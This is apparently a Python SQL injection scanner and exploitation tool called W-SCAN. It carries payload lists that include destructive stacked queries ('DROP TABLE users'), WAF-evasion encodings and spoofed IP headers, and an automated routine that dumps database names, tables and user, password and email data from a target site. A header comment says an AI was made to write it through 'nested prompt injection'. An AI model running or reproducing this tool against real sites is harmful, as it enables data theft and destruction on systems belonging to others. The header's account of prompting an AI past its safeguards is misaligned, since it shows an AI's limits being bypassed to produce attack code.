'''THIS TOOL WAS MOSTLY GENARETED BY AI ,COPIED FROM ANOTHER CODE ,DUE TO BASIC KNOWLADGE ITS SO BIG FOR ME . BY THE WAY THE TECHNIQE I USED WAS NESTED PROMPT INJECTION TECHNIQE ,AND TOOLS WORKFLOW AND OTHER IDEA WAS MINE AND THIS IS JUST BASIC NEXT VERSION WE CAN TRY ON MORE INDEPTH UPGRADE LIKE SQLMAP 

#LAZY COADER NASIF - WHO CAN READ CODE BUT CANT WRITE :)'''


import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
import random
import time
import threading
import sys
import os
import json
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.panel import Panel
from rich.logging import RichHandler
from rich.text import Text
from rich import box
import logging
import colorama
from colorama import Fore, Style
import pyfiglet

# Initialize colorama
colorama.init()

# Setup console and logger
console = Console()
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True, console=console)]
)
log = logging.getLogger("SQLScanner")

# Global Variables
payloads = [
    # Basic authentication bypass
    "' OR '1'='1' --",
    "' OR 1=1--",
    "' OR '1'='1' #",
    "admin'--",
    "admin' #",
    
    # Union-based injections
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT null,null,null --",
    "' UNION ALL SELECT null,null,null --",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT 1,@@version,3 --",
    
    # Boolean-based blind
    "' AND '1'='1' --",
    "' AND '1'='2' --",
    "' OR 'a'='a' --",
    "' OR 'a'='b' --",
    
    # Time-based blind
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "' AND BENCHMARK(1000000,MD5('test'))--",
    "' OR pg_sleep(5)--",
    "' WAITFOR DELAY '00:00:05'--",
    
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)--",
    
    # Stacked queries
    "'; DROP TABLE users --",
    "'; UPDATE users SET password='hacked' --",
    
    # WAF bypass variations
    "'/**/OR/**/'1'='1'--",
    "'%0AOR%0A'1'='1'--",
    "'/*!50000OR*/'1'='1'--",
    "' OR '1'='1' -- -",
    "' OR '1'='1'/*",
]

# Advanced WAF bypass payloads
waf_bypass_payloads = [
    # Encoding bypass
    "%27%20%4f%52%20%27%31%27%3d%27%31%27%20%2d%2d",
    "%27%20UNION%20SELECT%201%2C2%2C3%20%2d%2d",
    
    # Case variation
    "' oR '1'='1' --",
    "' uNiOn SeLeCt 1,2,3 --",
    
    # Comment bypass
    "'/**/OR/**/'1'='1'/**/--",
    "'/*!50000OR*//**/'1'='1'--",
    
    # Null byte injection
    "'%00' OR '1'='1' --",
    
    # Tab and newline
    "'\tOR\t'1'='1'\t--",
    "'\nOR\n'1'='1'\n--",
    
    # Double encoding
    "%2527%2520OR%2520%25271%2527%253d%25271%2527%2520--",
]

db_extraction_payloads = {
    "databases": ["' UNION SELECT schema_name, null FROM information_schema.schemata--", 
                  "' UNION SELECT schema_name, 2 FROM information_schema.schemata--"],
    "tables": ["' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='{}'--",
               "' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='{}'--"],
    "columns": ["' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='{}'--",
                "' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='{}'--"],
    "data": ["' UNION SELECT {}, null FROM {}--",
             "' UNION SELECT {}, 2 FROM {}--"]
}

# Extensive user agents list 
#user agents are genareted by my very own user agent genaretor.
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# WAF bypass headers/copied from another tools
headers_template = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}
# ei jaygay text print er speed control kora jay 
def slow_print(text, delay=0.03, color=Fore.CYAN):
    """Print text with typing effect"""
    for char in text:
        print(color + char + Style.RESET_ALL, end='', flush=True)
        time.sleep(delay)
    print()

def load_external_payloads(file_path):
    """Load additional payloads from external file"""
    if not os.path.exists(file_path):
        console.print(f"[bold red][!][/bold red] Payload file not found: {file_path}")
        return []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            external_payloads = [line.strip() for line in file if line.strip() and not line.startswith('#')]
        console.print(f"[bold green][+][/bold green] Loaded {len(external_payloads)} payloads from {file_path}")
        return external_payloads
    except Exception as e:
        console.print(f"[bold red][!][/bold red] Error loading payload file: {e}")
        return []

def generate_waf_headers():
    """Generate headers designed to bypass WAF"""
    """This part was copied from a ddos tool"""
    headers = headers_template.copy()
    headers["User-Agent"] = random.choice(user_agents)
    headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["X-Real-IP"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["X-Client-IP"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["X-Originating-IP"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["X-Remote-IP"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["X-Remote-Addr"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["X-Cluster-Client-IP"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers["Referer"] = "https://www.google.com/"
    headers["X-Requested-With"] = "XMLHttpRequest"
    
    # Add some random headers
    headers[f"X-Random-{random.randint(1000, 9999)}"] = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
    
    return headers

def encode_payload(payload, technique="default"):
    """Encode payload using various techniques to bypass WAF"""
    if technique == "url_encode":
        return quote(payload)
    elif technique == "double_url_encode":
        return quote(quote(payload))
    elif technique == "unicode":
        return payload.replace("'", "%u0027").replace(" ", "%u0020")
    elif technique == "html_entities":
        return payload.replace("'", "&#39;").replace("\"", "&quot;")
    elif technique == "mixed_case":
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
    elif technique == "comment_obfuscation":
        return payload.replace(" ", "/**/").replace("OR", "/*!50000OR*/")
    else:
        return payload

def detect_waf(response):
    """Detect if WAF is present based on response characteristics"""
    waf_indicators = [
        "cloudflare", "incapsula", "akamai", "imperva", "barracuda",
        "fortinet", "f5", "mod_security", "sucuri", "wordfence",
        "blocked", "forbidden", "access denied", "security", "waf"
    ]
    
    for indicator in waf_indicators:
        if indicator in response.text.lower():
            return True
        if indicator in response.headers.get('server', '').lower():
            return True
        if indicator in response.headers.get('x-powered-by', '').lower():
            return True
    
    return False

def send_advanced_payload(url, param, payload, timeout=10):
    """Send payload with advanced WAF bypass techniques"""
    techniques = ["default", "url_encode", "double_url_encode", "unicode", "html_entities", "mixed_case", "comment_obfuscation"]
    
    for technique in techniques:
        encoded_payload = encode_payload(payload, technique)
        full_url = f"{url}?{param}={encoded_payload}"
        
        try:
            response = requests.get(
                full_url, 
                headers=generate_waf_headers(), 
                timeout=timeout,
                allow_redirects=False
            )
            
            if response.status_code == 200:
                return response, technique
                
        except requests.exceptions.RequestException:
            continue
    
    return None, None

def is_vulnerable(response, original_response, payload):
    """Enhanced vulnerability detection"""
    # Error-based detection
    error_indicators = [
        "sql syntax", "mysql_fetch", "ora-", "microsoft odbc", "postgresql",
        "warning:", "mysql error", "mysqli_", "pdoexception", "sqlite_exception",
        "unclosed quotation mark", "unterminated string", "syntax error"
    ]
    
    for error in error_indicators:
        if error in response.text.lower():
            return True
    
    # Boolean-based detection
    if original_response and response.text != original_response.text:
        return True
    
    # Time-based detection (for time-based payloads)
    if "SLEEP" in payload.upper() or "BENCHMARK" in payload.upper() or "WAITFOR" in payload.upper():
        # This would need timing measurement in real implementation
        pass
    
    # Length-based detection
    if original_response and abs(len(response.text) - len(original_response.text)) > 100:
        return True
    
    return False

def extract_database_info(base_url, param, log_file):
    """Enhanced database information extraction"""
    extracted_data = {"databases": [], "tables": {}, "columns": {}, "data_samples": {}}
    
    console.print(f"\n[bold cyan][*][/bold cyan] Starting advanced database extraction...")
    
    # Extract databases with multiple payload attempts
    for db_payload in db_extraction_payloads["databases"]:
        console.print(f"[bold cyan][*][/bold cyan] Trying database extraction payload...")
        response, technique = send_advanced_payload(base_url, param, db_payload)
        
        if response and response.status_code == 200:
            databases = parse_database_response(response.text)
            if databases:
                extracted_data["databases"] = databases
                console.print(f"[bold green][+][/bold green] Found {len(databases)} databases using {technique} technique")
                break
    
    # Extract tables for each database
    for db in extracted_data["databases"]:
        console.print(f"[bold cyan][*][/bold cyan] Extracting tables from database: [bold yellow]{db}[/bold yellow]")
        
        for table_payload_template in db_extraction_payloads["tables"]:
            table_payload = table_payload_template.format(db)
            response, technique = send_advanced_payload(base_url, param, table_payload)
            
            if response and response.status_code == 200:
                tables = parse_database_response(response.text)
                if tables:
                    extracted_data["tables"][db] = tables
                    console.print(f"[bold green][+][/bold green] Found {len(tables)} tables in {db}")
                    break
    
    # Extract columns for each table
    for db, tables in extracted_data["tables"].items():
        for table in tables:
            console.print(f"[bold cyan][*][/bold cyan] Extracting columns from table: [bold yellow]{table}[/bold yellow]")
            
            for column_payload_template in db_extraction_payloads["columns"]:
                column_payload = column_payload_template.format(table)
                response, technique = send_advanced_payload(base_url, param, column_payload)
                
                if response and response.status_code == 200:
                    columns = parse_database_response(response.text)
                    if columns:
                        extracted_data["columns"][table] = columns
                        console.print(f"[bold green][+][/bold green] Found {len(columns)} columns in {table}")
                        
                        # Try to extract sample data from interesting tables
                        if any(col in ['password', 'pass', 'pwd', 'user', 'username', 'email'] for col in columns):
                            extract_sample_data(base_url, param, table, columns, extracted_data, log_file)
                        break
    
    # Save extracted data
    save_extracted_data(extracted_data, log_file)
    return extracted_data

def extract_sample_data(base_url, param, table, columns, extracted_data, log_file):
    """Extract sample data from interesting tables"""
    console.print(f"[bold cyan][*][/bold cyan] Attempting to extract sample data from {table}")
    
    # Select up to 3 interesting columns
    interesting_columns = [col for col in columns if any(keyword in col.lower() for keyword in 
                        ['user', 'name', 'email', 'pass', 'id', 'login'])]
    
    if not interesting_columns:
        interesting_columns = columns[:3]  # Take first 3 columns if no interesting ones found
    
    if interesting_columns:
        columns_str = ", ".join(interesting_columns)
        for data_payload_template in db_extraction_payloads["data"]:
            data_payload = data_payload_template.format(columns_str, table)
            response, technique = send_advanced_payload(base_url, param, data_payload)
            
            if response and response.status_code == 200:
                sample_data = parse_data_response(response.text)
                if sample_data:
                    extracted_data["data_samples"][table] = sample_data
                    console.print(f"[bold green][+][/bold green] Extracted sample data from {table}")
                    
                    # Log sensitive data
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(f"\n[Sample Data from {table}]:\n")
                        for data in sample_data[:5]:  # Log first 5 samples
                            f.write(f"  {data}\n")
                    break

def parse_database_response(response_text):
    """Parse database information from response"""
    # This is a simplified parser - in real implementation, you'd need to adapt
    # based on the specific application's response format
    lines = response_text.split('\n')
    found_data = []
    
    # Look for potential database names, tables, or columns
    for line in lines:
        # Simple heuristic: look for words that might be database objects
        words = line.split()
        for word in words:
            clean_word = word.strip().lower()
            if (len(clean_word) > 2 and len(clean_word) < 50 and 
                clean_word not in ['the', 'and', 'or', 'null', 'div', 'table', 'column'] and
                not clean_word.startswith('<')):
                found_data.append(clean_word)
    
    return list(set(found_data))[:20]  # Return unique entries, limit to 20

def parse_data_response(response_text):
    """Parse data from response"""
    lines = response_text.split('\n')
    data = []
    
    for line in lines[:10]:  # Process first 10 lines
        clean_line = line.strip()
        if clean_line and len(clean_line) < 100:  # Reasonable length for data
            data.append(clean_line)
    
    return data

def save_extracted_data(extracted_data, log_file):
    """Save extracted database information"""
    with open(log_file.replace('.txt', '_extracted.json'), 'w', encoding='utf-8') as f:
        json.dump(extracted_data, f, indent=2)
    
    # Also save in human readable format
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write("\n" + "="*50 + "\n")
        f.write("EXTRACTED DATABASE INFORMATION\n")
        f.write("="*50 + "\n")
        
        f.write("\nDATABASES:\n")
        for db in extracted_data["databases"]:
            f.write(f"  - {db}\n")
        
        f.write("\nTABLES:\n")
        for db, tables in extracted_data["tables"].items():
            f.write(f"  {db}:\n")
            for table in tables:
                f.write(f"    - {table}\n")
        
        f.write("\nCOLUMNS:\n")
        for table, columns in extracted_data["columns"].items():
            f.write(f"  {table}:\n")
            for column in columns:
                f.write(f"    - {column}\n")
        
        f.write("\nSAMPLE DATA:\n")
        for table, samples in extracted_data["data_samples"].items():
            f.write(f"  {table}:\n")
            for sample in samples[:3]:  # First 3 samples
                f.write(f"    - {sample}\n")

def scan_parameter(base_url, param, value, log_file, scan_mode="quick"):
    """Enhanced parameter scanning with multiple techniques"""
    console.print(f"\n[bold cyan][*][/bold cyan] Scanning parameter: [bold yellow]{param}[/bold yellow]")
    
    # Get original response for comparison
    original_response = send_advanced_payload(base_url, param, value)[0]
    
    all_payloads = payloads + waf_bypass_payloads
    
    if scan_mode == "comprehensive":
        all_payloads = all_payloads * 2  # Test each payload with different encodings
    
    vulnerabilities_found = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"Testing {param}...", total=len(all_payloads))
        
        for payload in all_payloads:
            response, technique = send_advanced_payload(base_url, param, payload)
            
            if response and is_vulnerable(response, original_response, payload):
                vulnerability = {
                    "parameter": param,
                    "payload": payload,
                    "technique": technique,
                    "url": f"{base_url}?{param}={payload}"
                }
                vulnerabilities_found.append(vulnerability)
                
                console.print(f"\n[bold green][+][/bold green] VULNERABLE: {param}")
                console.print(f"    Payload: {payload}")
                console.print(f"    Technique: {technique}")
                console.print(f"    URL: {vulnerability['url']}")
                
                # Log vulnerability
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] VULNERABLE PARAMETER: {param}\n")
                    f.write(f"    Payload: {payload}\n")
                    f.write(f"    Technique: {technique}\n")
                    f.write(f"    URL: {vulnerability['url']}\n")
                
                # If vulnerable, attempt database extraction
                if scan_mode == "comprehensive":
                    console.print(f"[bold cyan][*][/bold cyan] Attempting database extraction...")
                    extract_database_info(base_url, param, log_file)
            
            progress.update(task, advance=1)
    
    if not vulnerabilities_found:
        console.print(f"[bold red][-][/bold red] No vulnerabilities found in parameter: {param}")
    
    return vulnerabilities_found

def scan_url(base_url, params, log_file, scan_mode="quick", max_threads=5):
    """Enhanced URL scanning with controlled threading"""
    console.print(f"\n[cyan]Starting {scan_mode} scan for:[/cyan] {base_url}")
    console.print(f"[cyan]Parameters found:[/cyan] {list(params.keys())}")
    
    # Test for WAF
    test_response = send_advanced_payload(base_url, list(params.keys())[0], "test")[0]
    if test_response and detect_waf(test_response):
        console.print("[bold yellow][!][/bold yellow] WAF detected! Using advanced bypass techniques...")
    
    all_vulnerabilities = []
    semaphore = threading.Semaphore(max_threads)
    
    def threaded_scan(param, value):
        with semaphore:
            vulnerabilities = scan_parameter(base_url, param, value[0], log_file, scan_mode)
            all_vulnerabilities.extend(vulnerabilities)
    
    threads = []
    for param, value in params.items():
        thread = threading.Thread(target=threaded_scan, args=(param, value))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    return all_vulnerabilities

def parse_url(url):
    """Parse URL and extract parameters"""
    try:
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        return base_url, params
    except Exception as e:
        console.print(f"[bold red][!][/bold red] Error parsing URL: {e}")
        return None, None

def display_banner():
    """Display professional banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner_text = pyfiglet.figlet_format("W-SCAN", font="small")
    console.print(Panel(
        f"[bold cyan]{banner_text}[/bold cyan]\n"
        f"[bold green]Advanced SQL Injection Vulnerability Scanner[/bold green]\n\n"
        f"[bold yellow]Features:[/bold yellow]\n"
        f"• Multiple SQLi Techniques\n"
        f"• WAF Bypass Capabilities\n" 
        f"• Database Extraction\n"
        f"• Concurrent Scanning\n"
        f"• Detailed Reporting\n\n"
        f"[bold red]For authorized testing only![/bold red]",
        box=box.DOUBLE_EDGE,
        border_style="bright_magenta"
    ))

def main():
    """Main function with enhanced user interface"""
    display_banner()
    
    # Get target URL with slow print
    slow_print("Enter the target URL (e.g., http://example.com/page.php?id=1): ", 0.02, Fore.YELLOW)
    url = input().strip()
    
    if not url:
        console.print("[bold red][!][/bold red] No URL provided. Exiting...")
        return
    
    base_url, params = parse_url(url)
    if not params:
        console.print("[bold red][!][/bold red] No parameters found in URL.")
        return
    
    # Select scan mode
    slow_print("\nSelect scan mode:", 0.02, Fore.CYAN)
    slow_print("1. Quick Scan (Fast, basic tests)", 0.01, Fore.WHITE)
    slow_print("2. Comprehensive Scan (Slow, thorough tests with DB extraction)", 0.01, Fore.WHITE)
    
    mode_choice = input("\nEnter choice (1 or 2): ").strip()
    scan_mode = "comprehensive" if mode_choice == "2" else "quick"
    
    # External payloads
    slow_print("\nLoad external payloads? (y/n): ", 0.02, Fore.CYAN)
    load_external = input().strip().lower()
    
    global payloads
    if load_external == 'y':
        slow_print("Enter path to payload file: ", 0.02, Fore.YELLOW)
        payload_file = input().strip()
        external_payloads = load_external_payloads(payload_file)
        payloads.extend(external_payloads)
    
    # Setup logging
    log_file = f"sql_scan_{int(time.time())}.txt"
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(f"SQL Injection Scan Report\n")
        f.write(f"Target: {url}\n")
        f.write(f"Mode: {scan_mode}\n")
        f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*50 + "\n\n")
    
    console.print(f"\n[cyan]Log file:[/cyan] {log_file}")
    console.print(f"[cyan]Scan mode:[/cyan] {scan_mode}")
    console.print(f"[cyan]Total payloads:[/cyan] {len(payloads)}")
    
    # Start scanning
    input("\nPress Enter to start scanning...")
    
    start_time = time.time()
    vulnerabilities = scan_url(base_url, params, log_file, scan_mode)
    end_time = time.time()
    
    # Display results
    console.print(f"\n[bold green]{'='*60}[/bold green]")
    console.print(f"[bold green] SCAN COMPLETED IN {end_time - start_time:.2f} SECONDS [/bold green]")
    console.print(f"[bold green]{'='*60}[/bold green]")
    
    if vulnerabilities:
        console.print(f"\n[bold green][✓][/bold green] Found {len(vulnerabilities)} vulnerabilities!")
        
        # Create results table
        table = Table(title="Vulnerabilities Found", show_header=True, header_style="bold magenta")
        table.add_column("Parameter", style="cyan")
        table.add_column("Technique", style="yellow")
        table.add_column("Payload Preview", style="white")
        
        for vuln in vulnerabilities:
            payload_preview = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
            table.add_row(vuln['parameter'], vuln['technique'] or "default", payload_preview)
        
        console.print(table)
    else:
        console.print(f"\n[bold red][✗][/bold red] No vulnerabilities found.")
    
    console.print(f"\n[bold cyan][*][/bold cyan] Detailed results saved to: {log_file}")
    
    if scan_mode == "comprehensive":
        extracted_file = log_file.replace('.txt', '_extracted.json')
        if os.path.exists(extracted_file):
            console.print(f"[bold cyan][*][/bold cyan] Extracted database info saved to: {extracted_file}")

# Handle CTRL+C gracefully
def signal_handler(sig, frame):
    console.print("\n\n[bold red][!][/bold red] Scan interrupted by user. Exiting...")
    sys.exit(0)

if __name__ == "__main__":
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red][!][/bold red] Scan interrupted by user. Exiting...")
    except Exception as e:
        console.print(f"\n[bold red][!][/bold red] Unexpected error: {e}")